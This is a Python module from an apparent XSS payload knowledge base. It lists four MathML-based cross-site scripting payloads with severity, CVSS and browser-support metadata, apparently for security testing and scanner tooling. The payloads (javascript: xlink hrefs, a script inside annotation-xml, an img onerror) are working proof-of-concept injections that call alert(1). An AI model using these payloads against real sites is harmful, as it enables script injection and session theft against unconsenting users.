#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

MathML-based XSS Payloads
"""

from ..models import PayloadEntry


MATHML_PAYLOADS = {
    "mathml_1": PayloadEntry(
        payload='<math xmlns="http://www.w3.org/1998/Math/MathML"><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML maction with xlink",
        tags=["mathml", "maction", "xlink"],
        browser_support=["firefox"],
        reliability="medium",
    ),
    "mathml_2": PayloadEntry(
        payload='<math><mi xlink:href="javascript:alert(1)">click</mi></math>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML mi with xlink href",
        tags=["mathml", "mi", "xlink"],
        browser_support=["firefox"],
        reliability="medium",
    ),
    "mathml_3": PayloadEntry(
        payload='<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="MathML annotation-xml HTML encoding",
        tags=["mathml", "annotation-xml", "html"],
        reliability="high",
    ),
    "mathml_4": PayloadEntry(
        payload='<math><mrow><semantics><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=alert(1)></annotation-xml></semantics></mrow></math>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML nested semantics with annotation",
        tags=["mathml", "semantics", "annotation-xml"],
        reliability="medium",
    ),
}

MATHML_PAYLOADS_TOTAL = len(MATHML_PAYLOADS)
